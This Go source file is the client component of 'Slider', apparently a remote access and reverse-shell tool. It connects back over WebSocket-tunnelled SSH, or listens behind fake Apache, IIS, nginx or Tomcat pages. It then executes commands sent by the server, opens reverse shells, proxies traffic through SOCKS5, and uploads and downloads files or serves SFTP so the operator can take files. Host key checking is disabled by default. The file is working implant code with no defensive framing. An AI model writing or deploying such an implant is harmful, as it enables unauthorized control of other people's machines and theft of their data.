package client

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/armon/go-socks5"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"slices"
	"slider/pkg/conf"
	"slider/pkg/interpreter"
	"slider/pkg/sconn"
	"slider/pkg/scrypt"
	"slider/pkg/sio"
	"slider/pkg/slog"
	"slider/pkg/web"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

type sessionTrack struct {
	SessionCount  int64              // Number of Sessions created
	SessionActive int64              // Number of Active Sessions
	Sessions      map[int64]*Session // Map of Sessions
}

type client struct {
	Logger            *slog.Logger
	serverAddr        string
	keepalive         time.Duration
	wsConfig          *websocket.Dialer
	httpHeaders       http.Header
	sshConfig         *ssh.ClientConfig
	shutdown          chan bool
	serverFingerprint []string
	sessionTrack      *sessionTrack
	sessionTrackMutex sync.Mutex
	isListener        bool
	firstRun          bool
	webTemplate       web.Template
	webRedirect       string
}

const clientHelp = `
Slider Client

  Creates a new Slider Client instance and connects 
to the defined Slider Server.

Usage: ./slider client [flags] [<[server_address]:port>]

Flags:`

var shutdown = make(chan bool, 1)

func NewClient(args []string) {
	defer close(shutdown)
	clientFlags := flag.NewFlagSet("client", flag.ContinueOnError)
	verbose := clientFlags.String("verbose", "info", "Adds verbosity [debug|info|warn|error|off]")
	keepalive := clientFlags.Duration("keepalive", conf.Keepalive, "Sets keepalive interval in seconds.")
	colorless := clientFlags.Bool("colorless", false, "Disables logging colors")
	fingerprint := clientFlags.String("fingerprint", "", "Server fingerprint for host verification")
	key := clientFlags.String("key", "", "Private key for authenticating to a Server")
	listener := clientFlags.Bool("listener", false, "Client will listen for incoming Server connections")
	port := clientFlags.Int("port", 8081, "Listener port")
	address := clientFlags.String("address", "0.0.0.0", "Address the Listener will bind to")
	retry := clientFlags.Bool("retry", false, "Retries reconnection indefinitely")
	webTemplate := clientFlags.String("template", "default", "Mimic web server page [apache|iis|nginx|tomcat]")
	webRedirect := clientFlags.String("redirect", "", "Redirect incoming HTTP connections to given URL")
	clientFlags.Usage = func() {
		fmt.Println(clientHelp)
		clientFlags.PrintDefaults()
		fmt.Println()
	}

	if fErr := clientFlags.Parse(args); fErr != nil {
		return
	}

	// Flag sanity check
	if fErr := flagSanityCheck(clientFlags); fErr != nil {
		fmt.Println(fErr)
		clientFlags.Usage()
		return
	}

	log := slog.NewLogger("Client")
	lvErr := log.SetLevel(*verbose)
	if lvErr != nil {
		fmt.Printf("wrong log level \"%s\", %s", *verbose, lvErr)
		return
	}

	// It is safe to assume that if PTY is On then colors are supported.
	if interpreter.IsPtyOn() && !*colorless {
		log.WithColors()
	}

	c := client{
		Logger:   log,
		shutdown: make(chan bool, 1),
		sessionTrack: &sessionTrack{
			Sessions: make(map[int64]*Session),
		},
		firstRun: true,
	}

	if *keepalive < conf.MinKeepAlive {
		c.Logger.Debugf("Overriding KeepAlive to minimum allowed \"%v\"", conf.MinKeepAlive)
		*keepalive = conf.MinKeepAlive
	}
	c.keepalive = *keepalive

	c.sshConfig = &ssh.ClientConfig{
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		ClientVersion:   "SSH-slider-client",
		Timeout:         conf.Timeout,
	}

	if *key != "" {
		if aErr := c.enableKeyAuth(*key); aErr != nil {
			c.Logger.Fatalf("%s", aErr)
		}
	}

	if *fingerprint != "" {
		if fErr := c.loadFingerPrint(*fingerprint); fErr != nil {
			c.Logger.Fatalf("%s", fErr)
		}
		c.sshConfig.HostKeyCallback = c.verifyServerKey
	}

	// Check the use of extra headers for added functionality
	// https://developer.mozilla.org/en-US/docs/Web/HTTP/Protocol_upgrade_mechanism
	c.httpHeaders = http.Header{}

	if *listener {
		c.isListener = *listener

		c.Logger.Debugf("Using \"%s\" web server template", *webTemplate)
		t, tErr := web.GetTemplate(*webTemplate)
		if tErr != nil {
			c.Logger.Errorf("%v", tErr)
		}
		c.webTemplate = t

		if *webRedirect != "" {
			if wErr := web.CheckURL(*webRedirect); wErr != nil {
				c.Logger.Fatalf("Redirect: %v", wErr)
			}
			c.webRedirect = *webRedirect
			c.Logger.Debugf("Redirecting incomming HTTP requests to \"%s\"", c.webRedirect)
		}

		fmtAddress := fmt.Sprintf("%s:%d", *address, *port)
		clientAddr, rErr := net.ResolveTCPAddr("tcp", fmtAddress)
		if rErr != nil {
			c.Logger.Fatalf("Not a valid IP address \"%s\"", fmtAddress)
		}

		go func() {
			handler := http.Handler(http.HandlerFunc(c.handleHTTPConn))
			if sErr := http.ListenAndServe(clientAddr.String(), handler); sErr != nil {
				c.Logger.Fatalf("%s", sErr)
			}
		}()
		c.Logger.Infof("Listening on %s://%s", clientAddr.Network(), clientAddr.String())
		<-shutdown
	} else {
		serverAddr, rErr := net.ResolveTCPAddr("tcp", clientFlags.Args()[0])
		if rErr != nil {
			c.Logger.Fatalf("Not a valid IP address \"%s\"", clientFlags.Args()[0])
		}
		c.serverAddr = serverAddr.String()
		c.wsConfig = conf.DefaultWebSocketDialer

		for loop := true; loop; {
			c.startConnection()

			// When the Client is not Listener a Server disconnection
			// will shut down the Client
			select {
			case <-shutdown:
				loop = false
			default:
				if !*retry || c.firstRun {
					loop = false
					continue
				}
				time.Sleep(c.keepalive)
			}
		}
	}

	c.Logger.Printf("Client down...")
}

func flagSanityCheck(clientFlags *flag.FlagSet) error {
	var flagExclusion []string
	var clientType string
	if conf.FlagIsDefined(clientFlags, "listener") {
		clientType = "listener"
		if conf.FlagIsDefined(clientFlags, "key") {
			flagExclusion = append(flagExclusion, "-key")
		}
		if conf.FlagIsDefined(clientFlags, "retry") {
			flagExclusion = append(flagExclusion, "-retry")
		}
		if len(clientFlags.Args()) > 0 {
			flagExclusion = append(flagExclusion, clientFlags.Args()...)
		}
	} else {
		clientType = "reverse"
		if conf.FlagIsDefined(clientFlags, "fingerprint") {
			flagExclusion = append(flagExclusion, "-fingerprint")
		}
		if conf.FlagIsDefined(clientFlags, "address") {
			flagExclusion = append(flagExclusion, "-address")
		}
		if conf.FlagIsDefined(clientFlags, "port") {
			flagExclusion = append(flagExclusion, "-port")
		}
		if conf.FlagIsDefined(clientFlags, "template") {
			flagExclusion = append(flagExclusion, "-template")
		}
		if conf.FlagIsDefined(clientFlags, "redirect") {
			flagExclusion = append(flagExclusion, "-redirect")
		}
		argNumber := len(clientFlags.Args())
		if argNumber != 1 {
			return fmt.Errorf("%s client requires exactly one valid server address as an argument", clientType)
		}
	}
	if len(flagExclusion) > 0 {
		return fmt.Errorf("%s client incompatible in order or definition with: %v", clientType, flagExclusion)
	}

	return nil
}

func (c *client) startConnection() {
	wsConn, _, wErr := c.wsConfig.DialContext(context.Background(), fmt.Sprintf("ws://%s", c.serverAddr), c.httpHeaders)
	if wErr != nil {
		c.Logger.Errorf("Can't connect to Server address: %s", wErr)
		return
	}
	session := c.newWebSocketSession(wsConn)
	session.disconnect = make(chan bool, 1)

	go c.newSSHClient(session)

	<-session.disconnect
	close(session.disconnect)
}

func (c *client) newSSHClient(session *Session) {
	netConn := sconn.WsConnToNetConn(session.wsConn)

	var reqChan <-chan *ssh.Request
	var newChan <-chan ssh.NewChannel
	var connErr error

	session.sshConn, newChan, reqChan, connErr = ssh.NewClientConn(netConn, c.serverAddr, c.sshConfig)
	if connErr != nil {
		c.Logger.Errorf("%s\n", connErr)
		session.disconnect <- true
		return
	}
	defer func() { _ = session.sshConn.Close() }()
	c.Logger.Infof("Server connected (%s)", session.wsConn.RemoteAddr().String())
	c.Logger.Debugf("%sSSH Session %v\n", session.logID, session.sshConn.SessionID())

	// Send Client Information to Server
	clientInfo := &conf.ClientInfo{Interpreter: session.interpreter}
	go session.sendClientInfo(clientInfo)

	// Set keepalive after connection is established
	go session.keepAlive(c.keepalive)

	if c.firstRun {
		c.firstRun = false
	}

	go session.handleGlobalChannels(newChan)
	session.handleGlobalRequests(reqChan)
}

func (c *client) enableKeyAuth(key string) error {
	signer, pErr := scrypt.SignerFromKey(key)
	if pErr != nil {
		return fmt.Errorf("failed to parse private key: %v", pErr)
	}
	c.sshConfig.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
	return nil
}

func (c *client) loadFingerPrint(fp string) error {
	// Check is fingerprint flag is a file or a fingerprint string
	// A file should contain a list of valid fingerprints
	fileInfo, sErr := os.Stat(fp)
	if sErr != nil {
		c.serverFingerprint = append(c.serverFingerprint, fp)
		return nil
	}
	if fileInfo.IsDir() {
		return fmt.Errorf("fingerprint flag points to a directory not a file")
	}
	file, fErr := os.Open(fp)
	if fErr != nil {
		return fmt.Errorf("failed to read fingerprint file - %s", fErr)
	}
	scan := bufio.NewScanner(file)
	for scan.Scan() {
		if f := scan.Text(); f != "" {
			c.serverFingerprint = append(c.serverFingerprint, f)
		}
	}

	return nil
}

func (c *client) verifyServerKey(_ string, remote net.Addr, key ssh.PublicKey) error {
	serverFingerprint, fErr := scrypt.GenerateFingerprint(key)
	if fErr != nil {
		return fErr
	}

	if slices.Contains(c.serverFingerprint, serverFingerprint) {
		c.Logger.Infof("Server successfully vefified with provided fingerprint")
		return nil
	}

	return fmt.Errorf("server %s - verification failed (fingerprint: %s)", remote.String(), serverFingerprint)
}

func (s *Session) sendClientInfo(ci *conf.ClientInfo) {
	clientInfoBytes, _ := json.Marshal(ci)
	ok, _, sErr := s.sshConn.SendRequest("client-info", true, clientInfoBytes)
	if sErr != nil || !ok {
		s.Logger.Errorf("%sclient information was not sent to server - %v", s.logID, sErr)
	}
}

func (s *Session) handleGlobalChannels(newChan <-chan ssh.NewChannel) {
	for nc := range newChan {
		switch nc.ChannelType() {
		case "socks5":
			s.Logger.Debugf("%sOpening \"%s\" channel", s.logID, nc.ChannelType())
			go s.handleSocksChannel(nc)
		case "file-upload":
			s.Logger.Debugf("%sOpening \"%s\" channel", s.logID, nc.ChannelType())
			go s.handleFileUploadChannel(nc)
		case "file-download":
			s.Logger.Debugf("%sOpening \"%s\" channel", s.logID, nc.ChannelType())
			go s.handleFileDownloadChannel(nc)
		case "sftp":
			s.Logger.Debugf("%sOpening \"%s\" channel", s.logID, nc.ChannelType())
			go s.handleSFTPChannel(nc)
		default:
			s.Logger.Debugf("%sRejected channel %s", s.logID, nc.ChannelType())
			if rErr := nc.Reject(ssh.UnknownChannelType, ""); rErr != nil {
				s.Logger.Warnf("%sReceived Unknown channel type \"%s\" - %s",
					s.logID,
					nc.ChannelType(),
					rErr,
				)
			}
		}
	}
}

func (s *Session) handleGlobalRequests(requests <-chan *ssh.Request) {
	for req := range requests {
		switch req.Type {
		case "keep-alive":
			if err := s.replyConnRequest(req, true, []byte("pong")); err != nil {
				s.Logger.Errorf("%sError sending \"%s\" reply to Server - %v", s.logID, req.Type, err)
			}
		case "session-exec":
			s.Logger.Debugf("%sReceived \"%s\" Connection Request", s.logID, req.Type)
			go s.sendCommandExec(req)
		case "session-shell":
			s.Logger.Debugf("%sReceived \"%s\" Connection Request", s.logID, req.Type)
			go s.sendReverseShell(req)
		case "window-change":
			// Server only sends this Request if Interpreter is PTY
			// after Reverse Shell is sent, ergo PTY File has been created
			s.Logger.Debugf("%sServer Requested window change: %s\n", s.logID, req.Payload)
			var termSize interpreter.TermSize
			if err := json.Unmarshal(req.Payload, &termSize); err != nil {
				s.Logger.Fatalf("%s", err)
			}
			s.updatePtySize(termSize.Rows, termSize.Cols)
		case "checksum-verify":
			go s.verifyFileCheckSum(req)
		case "shutdown":
			s.Logger.Warnf("%sServer requested Client shutdown", s.logID)
			_ = s.replyConnRequest(req, true, nil)
			shutdown <- true
			s.disconnect <- true
		default:
			s.Logger.Debugf("%sReceived unknown Connection Request Type: \"%s\"", s.logID, req.Type)
			_ = req.Reply(false, nil)
		}
	}
}

func (s *Session) sendCommandExec(request *ssh.Request) {
	channel, _, openErr := s.sshConn.OpenChannel("session", nil)
	if openErr != nil {
		s.Logger.Errorf("%sFailed to open a \"session\" channel to server", s.logID)
		return
	}
	defer func() { _ = channel.Close() }()

	// Notify Server we are good to go
	if err := s.replyConnRequest(request, true, []byte("exec-ready")); err != nil {
		s.Logger.Errorf("%sFailed to send reply to request \"%s\"", s.logID, request.Type)
	}

	rcvCmd := string(request.Payload)
	s.Logger.Debugf("%sReceived Bytes Payload: %v, Command: \"%s\"", s.logID, request.Payload, rcvCmd)

	cmd := exec.Command(s.interpreter.Shell, append(s.interpreter.CmdArgs, rcvCmd)...) //nolint:gosec

	out, coErr := cmd.CombinedOutput()
	if coErr != nil {
		out = []byte(fmt.Sprintf("Failed to process command: %s", coErr))
	}
	_, cwErr := channel.Write(out)
	if cwErr != nil {
		s.Logger.Errorf("%sFailed to write command \"%s\" output into channel", s.logID, rcvCmd)
	}

}

func (s *Session) keepAlive(keepalive time.Duration) {
	ticker := time.NewTicker(keepalive)
	defer ticker.Stop()

	for {
		select {
		case <-s.disconnect:
			s.Logger.Infof("%sDisconnected from Server %s", s.logID, s.wsConn.RemoteAddr().String())
			return
		case <-ticker.C:
			_, p, sendErr := s.sendConnRequest("keep-alive", true, []byte("ping"))
			if sendErr != nil || !bytes.Equal(p, []byte("pong")) {
				s.Logger.Errorf("%sKeepAlive Check Lost connection to Server.", s.logID)
				s.disconnect <- true
			}
		}
	}
}

func (s *Session) sendConnRequest(reqType string, wantReply bool, payload []byte) (bool, []byte, error) {
	s.Logger.Debugf("%sSending Connection Request Type \"%s\" with Payload: \"%s\"", s.logID, reqType, payload)
	return s.sshConn.SendRequest(reqType, wantReply, payload)
}

func (s *Session) replyConnRequest(req *ssh.Request, reply bool, payload []byte) error {
	s.Logger.Debugf("%sReplying Connection Request Type \"%s\" with Payload: \"%s\"", s.logID, req.Type, payload)
	return req.Reply(reply, payload)
}

func (s *Session) handleSocksChannel(channel ssh.NewChannel) {
	socksChan, req, aErr := channel.Accept()
	if aErr != nil {
		s.Logger.Errorf(
			"%sFailed to accept \"%s\" channel\n%v",
			s.logID,
			channel.ChannelType(),
			aErr,
		)
		return
	}
	defer func() {
		s.Logger.Debugf("%sClosing Socks Channel", s.logID)
		_ = socksChan.Close()
	}()
	go ssh.DiscardRequests(req)

	// socks5 logger logs by default and it's very chatty
	socksServer, snErr := socks5.New(
		&socks5.Config{
			Logger: slog.NewDummyLog(),
		})
	if snErr != nil {
		s.Logger.Errorf("failed to create new socks server - %v", snErr)
		return
	}

	socksConn := sconn.SSHChannelToNetConn(socksChan)
	defer func() { _ = socksConn.Close() }()
	_ = socksServer.ServeConn(socksConn)
	s.Logger.Debugf("%sSFTP server stopped", s.logID)
}

func (s *Session) handleFileUploadChannel(channel ssh.NewChannel) {
	uploadChan, requests, aErr := channel.Accept()
	if aErr != nil {
		s.Logger.Errorf(
			"%sFailed to accept \"%s\" channel\n%v",
			s.logID,
			channel.ChannelType(),
			aErr,
		)
		return
	}
	defer func() { _ = uploadChan.Close() }()

	go ssh.DiscardRequests(requests)

	filePath := string(channel.ExtraData())

	file, fErr := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, 0644)
	defer func() { _ = file.Close() }()
	if fErr == nil {
		_, _ = io.Copy(file, uploadChan)
	}
}

func (s *Session) verifyFileCheckSum(req *ssh.Request) {
	var fileInfo sio.FileInfo
	s.Logger.Debugf("%sReceived \"%s\" Connection Request", s.logID, req.Type)
	if err := json.Unmarshal(req.Payload, &fileInfo); err != nil {
		_ = req.Reply(false, []byte("failed to unmarshal file info"))
	}

	_, checkSum, cErr := sio.ReadFile(fileInfo.FileName)
	if cErr != nil {
		_ = req.Reply(false, []byte(fmt.Sprintf("could not read file %s", fileInfo.FileName)))
	}

	if checkSum != fileInfo.CheckSum {
		_ = req.Reply(false, []byte(fmt.Sprintf(
			"checksum of src (%s) differs from dst (%s)",
			fileInfo.CheckSum, checkSum)))
	}
	_ = req.Reply(true, nil)
}

func (s *Session) handleFileDownloadChannel(channel ssh.NewChannel) {
	downloadChan, _, aErr := channel.Accept()
	if aErr != nil {
		s.Logger.Errorf(
			"%sFailed to accept \"%s\" channel\n%v",
			s.logID,
			channel.ChannelType(),
			aErr,
		)
		return
	}
	defer func() { _ = downloadChan.Close() }()

	srcFile := string(channel.ExtraData())
	file, checkSum, fErr := sio.ReadFile(srcFile)
	if fErr != nil {
		// Rejecting the Reply will tell the server the payload is an error
		_, _ = downloadChan.SendRequest("checksum", false, []byte(fmt.Sprintf("%s", fErr)))
	}
	// If the File was read Successfully we will send its CheckSum as Payload
	_, _ = downloadChan.SendRequest("checksum", true, []byte(checkSum))
	// Copy file over channel
	_, _ = downloadChan.Write(file)
}

func (s *Session) handleSFTPChannel(channel ssh.NewChannel) {
	s.Logger.Debugf("%sAccepting SFTP channel request", s.logID)
	sftpChan, requests, aErr := channel.Accept()
	if aErr != nil {
		s.Logger.Errorf(
			"%sFailed to accept \"%s\" channel\n%v",
			s.logID,
			channel.ChannelType(),
			aErr,
		)
		return
	}

	// Make sure the channel gets closed when we're done
	defer func() {
		s.Logger.Debugf("%sClosing SFTP channel", s.logID)
		_ = sftpChan.Close()
	}()

	// Handle channel requests in the background
	go ssh.DiscardRequests(requests)

	// Create SFTP server options
	var serverOptions []sftp.ServerOption
	if s.Logger.IsDebug() {
		serverOptions = append(serverOptions, sftp.WithDebug(os.Stderr))
	}

	// Create the SFTP server with the configured options
	s.Logger.Debugf("%sInitializing SFTP server", s.logID)
	server, err := sftp.NewServer(
		sftpChan,
		serverOptions...,
	)
	if err != nil {
		s.Logger.Errorf("%sFailed to create SFTP server: %v", s.logID, err)
		return
	}

	s.Logger.Infof("%sSFTP server started successfully", s.logID)

	// Serve SFTP connections
	if err := server.Serve(); err != nil {
		if err == io.EOF {
			s.Logger.Debugf("%sSFTP client disconnected", s.logID)
		} else {
			s.Logger.Errorf("%sSFTP server error: %v", s.logID, err)
		}
	}

	s.Logger.Debugf("%sSFTP server stopped", s.logID)
}
